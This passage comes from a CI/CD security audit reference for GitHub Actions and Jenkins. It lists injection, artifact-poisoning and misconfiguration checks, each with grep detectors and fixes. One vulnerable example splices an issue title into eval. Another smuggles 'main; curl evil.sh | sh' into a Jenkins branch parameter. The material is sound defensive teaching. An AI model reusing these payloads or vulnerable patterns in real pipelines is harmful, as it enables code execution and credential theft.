- **Source:** OWASP CICD-SEC-4 (Poisoned Pipeline Execution); [GitHub Security Lab Part 1](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/).

### 4.3 Unsafe use of `actions/github-script` with untrusted input
- **Severity:** Critical — `github-script` executes arbitrary Node.js with an authenticated Octokit client and (usually) `secrets.GITHUB_TOKEN`; if the script body itself interpolates untrusted context via template literals, it's equivalent to §4.1 but for JavaScript instead of shell, and can lead to full script injection.
- **Detect:**
  ```
  grep -RnB3 -A15 'uses:\s*actions/github-script' .github/workflows/ | grep -E '\$\{\{\s*github\.event\.'
  ```
  Flag any `script: |` block that builds a JS template string or regex directly from `${{ github.event.* }}` rather than reading it from `context.payload` inside the JS (which is still just data, not spliced source) — the real danger is specifically using YAML-level `${{ }}` substitution *inside* the `script:` body, which splices attacker text into the JS source before it's parsed.
- **Vulnerable example:**
  ```yaml
  - uses: actions/github-script@v7
    with:
      script: |
        const title = "${{ github.event.issue.title }}";  // spliced into JS source
        eval(title);  // or even without eval, a crafted title can break out of the string literal
  ```
- **Fix:** Use `context.payload` inside the script (real JS data access, not textual splice), and never `eval`/`Function()` on it:
  ```yaml
  - uses: actions/github-script@<sha>
    with:
      script: |
        const title = context.payload.issue.title; // safe: real JS variable, not spliced
        console.log(title);
  ```
- **Source:** [GitHub Security Lab Part 2 — Untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/); [GitHub Security Lab Part 4 — New vulnerability patterns and mitigation strategies](https://securitylab.github.com/resources/github-actions-new-patterns-and-mitigations/) (covers `github-script` and newer patterns like artifact poisoning).

### 4.4 `workflow_run`/artifact poisoning
- **Severity:** High — a privileged `workflow_run` workflow that downloads and *executes* (or unsafely evaluates/parses) an artifact produced by an unprivileged, attacker-influenced workflow can be tricked into running attacker content with elevated privileges.
- **Detect:** `workflow_run` handler jobs that download artifacts (`actions/download-artifact`) from the triggering workflow and then `run:` a script from that artifact, `source` it, or otherwise execute/`eval` its contents without treating it as pure, structurally-validated data.
- **Fix:** Only extract discrete, expected data fields (e.g., a PR number written to a single-line text file) from the artifact; validate format strictly (e.g., `[[ "$content" =~ ^[0-9]+$ ]]`) before use; never `source`/execute a downloaded artifact.
- **Source:** [GitHub Security Lab Part 4](https://securitylab.github.com/resources/github-actions-new-patterns-and-mitigations/); [CodeQL artifact-poisoning query](https://codeql.github.com/codeql-query-help/actions/actions-artifact-poisoning-medium/); real advisory: [GHSL-2024-178 (RSSHub, CVE-2024-47179, full repo takeover via artifact poisoning)](https://securitylab.github.com/advisories/GHSL-2024-178_RSSHub/).

### 4.5 Jenkins Groovy sandbox escapes
- **Severity:** Critical — successful escape grants execution in the Jenkins controller's own JVM, i.e., full control of the Jenkins instance (all credentials, all jobs, agent orchestration).
- **Detect:** Same as §3.5 — reflection-based patterns (`.class.forName`, `.classLoader`, `Class.forName`, `metaClass`, `@Grab` dynamic dependency loading) in a Jenkinsfile, plus checking installed **Script Security** / **Pipeline: Groovy** plugin versions against known CVEs (e.g. CVE-2022-43401) and confirming Jenkins core + those plugins are current per the [Jenkins Security Advisories](https://www.jenkins.io/security/advisory/) page.
- **Fix:** Keep plugins patched; do not grant `Overall/RunScripts` or blanket script-approval rights to non-admins; review every pending "In-process Script Approval" entry for suspicious signatures before approving; consider running Jenkins controller with a `SecurityManager`/JVM-level sandboxing in addition to the plugin-level sandbox (defense in depth) where supported by your Jenkins version.
- **Source:** [Jenkins Security Advisories](https://www.jenkins.io/security/advisory/) (recurring series); [CVE-2022-43401](https://github.com/advisories/GHSA-7vr5-72w7-q6jc).

### 4.6 Shell command injection via unsanitized parameters in Jenkinsfile `sh` steps
- **Severity:** Critical — directly analogous to GitHub Actions' `${{ }}`-in-`run:` problem: Groovy string interpolation (`"..."` with `${var}` or `$var`) inside an `sh` step splices attacker-influenced values into the shell command *before* the shell parses it.
- **Detect:**
  ```
  grep -RnE 'sh\s*\(?\s*"[^"]*\$\{?(params|env)\.[A-Za-z_]+' Jenkinsfile*
  ```
  Any `sh "…${params.X}…"` or `sh "…${env.X}…"` (double-quoted Groovy GString) where `X` derives from `parameters {}` (a `workflow_dispatch`-equivalent user-supplied build parameter), a webhook payload, branch name, or commit message.
- **Vulnerable example:**
  ```groovy
  parameters { string(name: 'BRANCH', defaultValue: 'main') }
  stage('Build') {
    steps {
      sh "git checkout ${params.BRANCH}"   // BRANCH = "main; curl evil.sh | sh" → executes
    }
  }
  ```
- **Fix:** Use single-quoted Groovy strings + shell environment variables (matches the shell-side fix pattern, not Groovy interpolation):
  ```groovy
  stage('Build') {
    environment { BRANCH = "${params.BRANCH}" }
    steps {
      sh 'git checkout "$BRANCH"'   // single-quoted: Groovy does NOT interpolate; shell expands safely and quoting prevents word-splitting/injection
    }
  }
  ```
  For extra safety, validate `params.BRANCH` against an allowlist regex (`^[A-Za-z0-9._/-]+$`) before use, and prefer `choice()` parameters over free-text `string()` parameters wherever the set of legal values is known.
- **Source:** Jenkins Pipeline documentation's own general guidance on Groovy string quoting inside `sh`/credentials contexts ("use single quotes whenever you can") extends directly to this injection class; OWASP CICD-SEC-4 (Poisoned Pipeline Execution) and general CWE-78 (OS Command Injection) applied to the pipeline-as-code context.

### 4.7 Missing input validation on `workflow_dispatch` inputs (and Jenkins build parameters)
- **Severity:** Medium-High — `workflow_dispatch`/parameterized builds are often assumed "trusted" because they require some level of repo access to trigger, but on repos with broad write/trigger access (or externally-exposed parameterized jobs, e.g. via a webhook-driven "remote build trigger" URL), unvalidated free-text inputs are just as dangerous as PR titles.
- **Detect:** `workflow_dispatch: inputs:` of `type: string` consumed directly in a `run:` block without going through `env:` (see 4.1's fix) and without an allowlist/regex check; Jenkins `parameters { string(...) }` used directly in `sh` without validation (see 4.6).
- **Fix:**
  ```yaml
  on:
    workflow_dispatch:
      inputs:
        environment:
          type: choice          # prefer choice over free string where possible
          options: [staging, production]
  jobs:
    deploy:
      steps:
        - env:
            ENVIRONMENT: ${{ inputs.environment }}
          run: ./deploy.sh "$ENVIRONMENT"
  ```
- **Source:** Same underlying principle as 4.1/4.6, applied to a distinct trigger type; OWASP CICD-SEC-1 (Insufficient Flow Control) for the "who can trigger this and with what" dimension.

---

## Part 5: General Hardening & Misconfiguration

### 5.1 Missing `timeout-minutes` / job timeouts
- **Severity:** Low-Medium — no direct compromise, but enables resource exhaustion (runaway jobs consuming runner/agent minutes or hung indefinitely holding an exclusive resource lock or credential lease) and is a documented DoS/cost vector for both hosted and self-hosted runners.
- **Detect:**
  ```
  grep -L 'timeout-minutes' .github/workflows/*.yml   # workflow/job with no timeout at all
  ```
  Jenkins: pipeline/stage with no `options { timeout(...) }`.
- **Fix:**
  ```yaml
  jobs:
    build:
      timeout-minutes: 15
      steps: ...
  ```
  ```groovy
  options {
    timeout(time: 15, unit: 'MINUTES')
  }
  ```
- **Source:** GitHub Actions documentation on `timeout-minutes` (default is 360 minutes / 6 hours if unset — effectively unbounded for most purposes); general CI hardening guidance.

### 5.2 Missing concurrency controls
- **Severity:** Low-Medium — without `concurrency:`, overlapping runs (e.g., rapid pushes to the same PR/branch) can race on shared resources (deployment targets, tags, caches), cause redundant resource consumption, or in worst cases let a stale/superseded run's deploy step finish *after* a newer one, effectively rolling back a fix.
- **Detect:** Workflows with `on: push`/`pull_request` and a deploy or release job, but no top-level `concurrency:` key.
- **Fix:**
  ```yaml
  concurrency:
    group: ${{ github.workflow }}-${{ github.ref }}
    cancel-in-progress: true
  ```
  Jenkins equivalent: `options { disableConcurrentBuilds() }` or the Lockable Resources plugin for cross-job resource exclusivity.
- **Source:** GitHub Actions `concurrency` documentation; general CI/CD reliability & security hardening practice (prevents certain classes of race-condition-driven deploy issues).

### 5.3 Overly permissive triggers
- **Severity:** High for `pull_request_target` on public repos (see §1.5/§4.2); Medium for unrestricted `push`/`pull_request` triggers on every branch with no path/branch filtering.
- **Detect:**
  ```
  grep -RnB2 'pull_request_target' .github/workflows/*.yml   # check repo visibility
  ```
  Flag `on: push` / `on: pull_request` with no `branches:`/`paths:` filter on repos where that triggers expensive or privileged jobs (e.g., deploy-capable workflows firing on every feature branch push).
- **Fix:** Scope triggers narrowly:
  ```yaml
  on:
    push:
      branches: [main]
    pull_request:
      branches: [main]
  ```
  For public repos, avoid `pull_request_target` entirely unless the split-workflow pattern (§1.5) is used; require **"Require approval for all external contributors"** in repo Settings → Actions.
- **Source:** [GitHub Docs – Security hardening for GitHub Actions](https://docs.github.com/actions/security-guides/security-hardening-for-github-actions); [OWASP GitHub Actions Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GitHub_Actions_Security_Cheat_Sheet.html) #4 "Restrict... require approval for all external contributors."

### 5.4 Artifact retention/exposure issues
- **Severity:** Medium — default/long artifact retention on public repos means build artifacts (which can contain debug symbols, embedded secrets from a prior mistake, or internal paths/hostnames) remain downloadable by anyone for the full retention window; artifacts are also a poisoning vector (§4.4).
- **Detect:** `actions/upload-artifact` with no `retention-days` override on a public repo, or artifacts containing `.env`, credential files, or `.git` directories bundled in by an overly broad `path:` glob.
- **Fix:**
  ```yaml
  - uses: actions/upload-artifact@<sha>
    with:
      name: build
      path: dist/
      retention-days: 1   # minimize exposure window
  ```
  Explicitly exclude sensitive paths (`!**/.env`, `!**/*.pem`) from artifact globs; disable caching/artifact use in release-signing/publish workflows to reduce artifact-poisoning surface (per §4.4).
- **Source:** OWASP GitHub Actions Cheat Sheet — "Prevent Artifact Poisoning: disable caching in release/publishing workflows, verify artifact integrity"; OWASP CICD-SEC-9.

### 5.5 Self-hosted runners on public repositories
- **Severity:** Critical — this is explicitly and repeatedly called out by GitHub itself as a pattern to avoid; any external contributor who can open a PR against the repo can get arbitrary code execution on your self-hosted runner infrastructure, and — because runners are typically **not ephemeral by default** — persist access across subsequent jobs (credential theft, lateral movement into your network, planting backdoors for future runs).
- **Detect:** `runs-on: [self-hosted, ...]` (any label other than GitHub-hosted `ubuntu-latest`/`windows-latest`/`macos-latest`) in a **public** repository, especially combined with a `pull_request` trigger.
  ```
  grep -RnE 'runs-on:.*self-hosted' .github/workflows/*.yml
  ```
- **Fix:** Never use self-hosted runners for public repos. If unavoidable, require external-contributor-approval for workflow runs, use **ephemeral, single-job, container-isolated** runners (JIT runners) that are destroyed after each job, restrict runner network egress, and place them in dedicated, network-segmented runner groups scoped to specific repos.
- **Source:** [GitHub Docs – Security hardening for GitHub Actions § Hardening for self-hosted runners](https://docs.github.com/actions/security-guides/security-hardening-for-github-actions) — "Self-hosted runners should almost never be used for public repositories... any user can open pull requests against the repository and compromise the environment."; OWASP GitHub Actions Cheat Sheet #7.

### 5.6 Deprecated/insecure workflow commands — `::set-output::`/`::save-state::` (CVE-2020-15228)
- **Severity:** High (historical, but still worth flagging if legacy workflows/actions haven't migrated) — the old `::set-output name=x::value` / `::set-env name=x::value` workflow commands were parsed out of **raw stdout of the run step**, meaning any *untrusted output* echoed by a script (e.g., from a dependency's build log, or attacker-controlled data processed earlier in the step) could inject arbitrary new environment variables or outputs by simply printing a crafted `::set-env::` string — a form of environment variable injection.
- **Detect:**
  ```
  grep -RnE '::(set-output|save-state|set-env|add-path)::' .github/workflows/ **/action.yml
  ```
  Also flag any custom/composite action still using `echo "::set-output name=x::$VALUE"` instead of writing to `$GITHUB_OUTPUT`.
- **Fix:**
  ```yaml
  # BAD (deprecated, and was the root cause of CVE-2020-15228)
  - run: echo "::set-output name=result::success"
  - run: echo "MY_VAR=value" >> not_the_right_mechanism # old set-env style

  # GOOD (current mechanism, file-based, not stdout-parsed)
  - run: echo "result=success" >> "$GITHUB_OUTPUT"
  - run: echo "MY_VAR=value" >> "$GITHUB_ENV"
  ```
- **Source:** [GHSA-mfwh-5m23-j46w / CVE-2020-15228 – "Environment Variable Injection in GitHub Actions"](https://github.com/advisories/GHSA-mfwh-5m23-j46w); [GitHub Changelog – "Deprecating set-env and add-path commands"](https://github.blog/changelog/2020-10-01-github-actions-deprecating-set-env-and-add-path-commands/) (commands fully disabled by default since; still a strong "smell" if found in old copy-pasted YAML or third-party actions not updated since 2020).

### 5.7 `actions/checkout` with default `persist-credentials: true`
- **Severity:** Medium — by default, `actions/checkout` leaves the ephemeral `GITHUB_TOKEN` (with the job's granted permissions) configured in the local git credential store (`.git/config`) for the remainder of the job. Any subsequent step — including third-party actions or injected/untrusted code — can read that token from the git config and use it, independent of whether it was ever passed to that step via `env:`.
- **Detect:**
  ```
  grep -RnA5 'uses:\s*actions/checkout' .github/workflows/*.yml | grep -v 'persist-credentials:\s*false'
  ```
- **Fix:**
  ```yaml
  - uses: actions/checkout@<sha>
    with:
      persist-credentials: false
  ```
  Set this on every checkout in jobs that don't specifically need `git push`/further authenticated git operations later in the same job.
- **Source:** [OWASP GitHub Actions Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GitHub_Actions_Security_Cheat_Sheet.html) #22; [actions/checkout issue #2312 — "Escalate concerning default persist-credentials=true"](https://github.com/actions/checkout/issues/2312) (active community discussion pushing for the default itself to change).

### 5.8 Missing branch protection / required review context for workflow files
- **Severity:** Medium-High — if `.github/workflows/**` (or `Jenkinsfile`) can be modified without required review, any contributor with push access can silently grant themselves secrets access or weaken CI security controls (a direct instance of OWASP CICD-SEC-1, Insufficient Flow Control).
- **Detect:** Repo Settings: no branch protection rule on the default branch requiring PR review; no `CODEOWNERS` entry covering `.github/workflows/` (or `Jenkinsfile`) requiring a specific security-aware reviewer.
- **Fix:**
  ```
  # .github/CODEOWNERS
  /.github/workflows/  @org/platform-security
  /Jenkinsfile          @org/platform-security
  ```
  Enable branch protection: required PR reviews, required status checks, restrict who can push directly to default branch, and (where feasible) require signed commits.
- **Source:** [OWASP GitHub Actions Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GitHub_Actions_Security_Cheat_Sheet.html) #4; OWASP CICD-SEC-1.

### 5.9 Jenkins CSRF protection disabled
- **Severity:** Critical if disabled — Jenkins CSRF protection ("crumb") prevents an attacker from tricking an authenticated admin's browser into issuing state-changing requests (e.g., creating a job that runs arbitrary shell commands) via a malicious webpage/link. Jenkins' own documentation is unusually blunt that this should almost never be turned off.
- **Detect:** Jenkins system property `hudson.security.csrf.GlobalCrumbIssuerConfiguration.DISABLE_CSRF_PROTECTION=true` set anywhere (JVM args, Configuration-as-Code YAML, Docker `JAVA_OPTS`/`JENKINS_JAVA_OPTS`); or **Manage Jenkins → Security** showing "Prevent Cross Site Request Forgery exploits" unchecked.
  ```
  grep -RnE 'DISABLE_CSRF_PROTECTION' . 2>/dev/null
  ```
- **Fix:** Leave CSRF protection enabled (it is on by default since Jenkins 2.x); if a legacy plugin genuinely requires it disabled, isolate that use case rather than disabling globally, and treat it as a compensating-control gap requiring documented risk acceptance.
- **Source:** [Jenkins CSRF Protection documentation](https://www.jenkins.io/doc/book/security/csrf-protection/) — "It is strongly recommended that CSRF protection be left enabled, including on instances operating on private, fully trusted networks."; OWASP CICD-SEC-7 (Insecure System Configuration).

### 5.10 `-Djenkins.install.runSetupWizard=false` and other insecure-default bootstrap flags
- **Severity:** High — this flag (commonly used to automate/containerize Jenkins provisioning) skips the interactive setup wizard, which is also the mechanism that normally forces you to set an initial admin password and choose a security realm/authorization strategy. Used carelessly (e.g., in a Docker image or IaC template without an accompanying Configuration-as-Code security setup), it can leave a freshly-provisioned controller with **no authentication or anonymous full-access authorization** exposed, especially if also combined with binding `0.0.0.0` before any security config is applied.
- **Detect:** Dockerfiles/IaC/Helm values containing `runSetupWizard=false` (or `JENKINS_OPTS=--argumentsRealm...` insecure defaults) with **no** accompanying `jenkins.yaml` (Configuration-as-Code) that sets a real `securityRealm`/`authorizationStrategy`, or no `admin` user/credential provisioned before the controller becomes network-reachable.
  ```
  grep -RnE 'runSetupWizard=false' . 2>/dev/null
  ```
- **Fix:** If skipping the wizard for automated provisioning (a legitimate, common pattern), always pair it with a Jenkins Configuration-as-Code (`jenkins.yaml`) file that explicitly configures a real security realm (e.g., LDAP/SSO) and a least-privilege authorization strategy (e.g., `roleBased` or `matrixBased`, never `unsecured` or "logged-in users can do anything" combined with public network exposure), and ensure the controller is not reachable on the network before that config lands.
- **Source:** Jenkins' own [Standard Security Setup](https://www.jenkins.io/doc/book/security/) documentation implies the setup wizard's role in establishing initial security posture; this is widely documented as a common Jenkins-in-Docker misconfiguration in CIS-style hardening guides for Jenkins; OWASP CICD-SEC-7 (Insecure System Configuration).

### 5.11 Missing signed commits / unverified webhook payloads
- **Severity:** Medium — without commit signing, a compromised or spoofed git identity is harder to detect after the fact; without webhook signature verification (for any custom webhook-triggered automation, e.g., a Jenkins generic-webhook-trigger), the trigger endpoint can be invoked by anyone who finds/guesses the URL, without proof it actually originated from GitHub.
- **Detect:** Branch protection with "Require signed commits" unchecked; Jenkins generic webhook trigger jobs with no shared-secret/HMAC signature validation (`X-Hub-Signature-256` header) before acting on the payload.
- **Fix:** Enable "Require signed commits" in branch protection for security-sensitive repos; validate GitHub webhook signatures using the shared secret and `X-Hub-Signature-256` (HMAC-SHA256) before trusting payload contents in any custom receiver.
- **Source:** GitHub branch protection documentation (signed commits requirement); GitHub webhook documentation on `X-Hub-Signature-256` validation; OWASP CICD-SEC-1/CICD-SEC-9.

---

## Appendix A: Quick-Reference grep/detection cheat sheet

```bash
# GitHub Actions
grep -RnE 'uses:\s*[A-Za-z0-9._-]+/[A-Za-z0-9._-]+@(v?[0-9.]+|main|master|latest)\b' .github/workflows/   # unpinned actions
grep -RnE 'pull_request_target' .github/workflows/                                                       # dangerous trigger
grep -RnE 'run:.*\$\{\{\s*github\.event\.' .github/workflows/                                            # potential script injection
grep -L '^permissions:' .github/workflows/*.yml                                                          # missing permissions block
grep -RnE 'permissions:\s*write-all' .github/workflows/                                                  # overbroad token
grep -RnE 'runs-on:.*self-hosted' .github/workflows/*.yml                                                # self-hosted (check repo visibility)
grep -RnE '::(set-output|save-state|set-env|add-path)::' .github/workflows/                              # deprecated commands (CVE-2020-15228)
grep -L 'timeout-minutes' .github/workflows/*.yml                                                        # missing timeouts
grep -RnA5 'uses:\s*actions/checkout' .github/workflows/*.yml | grep -v persist-credentials               # credential persistence

# Jenkins
grep -RnE "(password|token|apikey|secret)\s*[:=]\s*['\"][^'\"]{6,}['\"]" Jenkinsfile*                    # hardcoded secrets
grep -RnE 'sh\s*\(?\s*"[^"]*\$\{?(params|env)\.' Jenkinsfile*                                            # command injection via GString
grep -RnE '(class\.forName|\.classLoader|@Grab)' Jenkinsfile*                                            # sandbox-escape patterns
grep -RnE '^[a-zA-Z0-9_-]+$' plugins.txt                                                                 # unpinned plugin versions
grep -RnE 'DISABLE_CSRF_PROTECTION|runSetupWizard=false' . 2>/dev/null                                    # insecure bootstrap flags
```

## Appendix B: Primary sources index

- [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
- [OWASP CI/CD Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html)
- [OWASP GitHub Actions Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GitHub_Actions_Security_Cheat_Sheet.html)
- [GitHub Docs – Security hardening for GitHub Actions](https://docs.github.com/actions/security-guides/security-hardening-for-github-actions)
- [GitHub Security Lab – Part 1: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [GitHub Security Lab – Part 2: Untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/)
- [GitHub Security Lab – Part 4: New vulnerability patterns and mitigation strategies](https://securitylab.github.com/resources/github-actions-new-patterns-and-mitigations/)
- [CodeQL: Code injection query help](https://codeql.github.com/codeql-query-help/actions/actions-code-injection-critical/)
- [CodeQL: Artifact poisoning query help](https://codeql.github.com/codeql-query-help/actions/actions-artifact-poisoning-medium/)
- [GHSA-mfwh-5m23-j46w / CVE-2020-15228 (set-output env injection)](https://github.com/advisories/GHSA-mfwh-5m23-j46w)
- [CVE-2025-30066 – tj-actions/changed-files compromise (Wiz)](https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066)
- [CISA Alert on tj-actions/reviewdog compromise](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction)
- [SLSA.dev v1.0 Build Track Levels](https://slsa.dev/spec/v1.0/levels)
- [Jenkins Security documentation](https://www.jenkins.io/doc/book/security/)
- [Jenkins Security Advisories index](https://www.jenkins.io/security/advisory/)
- [CVE-2022-43401 (Script Security / Pipeline Groovy sandbox bypass)](https://github.com/advisories/GHSA-7vr5-72w7-q6jc)
- [Jenkins Credentials Binding Plugin docs](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)
- [Jenkins CSRF Protection documentation](https://www.jenkins.io/doc/book/security/csrf-protection/)
- [CIS Docker Benchmarks](https://www.cisecurity.org/benchmark/docker)

---

**Notes for use in the audit skill:** Map every finding to (1) an OWASP CICD-SEC code, (2) a severity from this doc, (3) file:line evidence of the exact matched pattern, and (4) a remediation snippet adapted from the "Fix" examples above. Where a repository's context can't be determined from static inspection alone (e.g., repo public/private visibility for the self-hosted-runner and `pull_request_target` checks, or org-level default token permissions), the report should state the check as conditional/needs-verification rather than asserting severity outright.
